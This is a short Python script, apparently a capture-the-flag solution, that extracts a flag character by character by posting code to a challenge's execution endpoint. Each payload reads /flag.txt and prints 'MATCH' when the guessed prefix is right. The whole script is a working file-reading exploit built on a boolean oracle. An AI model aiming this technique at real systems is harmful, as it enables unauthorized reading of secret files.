import requests

# The URL of the challenge's execution endpoint
TARGET_URL = "http://challenge.example.com/run" 

def check_char(current_prefix, char_to_test):
    # This payload only produces output if the condition is met in BOTH universes.
    # We use a slice to check if the flag starts with our current known string + new char.
    payload = f"""
flag = open("/flag.txt").read()
if flag.startswith("{current_prefix + char_to_test}"):
    print("MATCH")
"""
    response = requests.post(TARGET_URL, data={'code': payload})
    
    # If both universes "agree" that the char matches, the gate lets "MATCH" through.
    return "MATCH" in response.text

alphabet = "abcdefghijklmnopqrstuvwxyz0123456789_!}"
flag = "0xfun{"

print(f"Starting brute force from: {flag}")

while not flag.endswith("}"):
    for char in alphabet:
        if check_char(flag, char):
            flag += char
            print(f"Found character! Current flag: {flag}")
            break
    else:
        print("Failed to find next character. Check your alphabet or connection.")
        break

print(f"Final Flag: {flag}")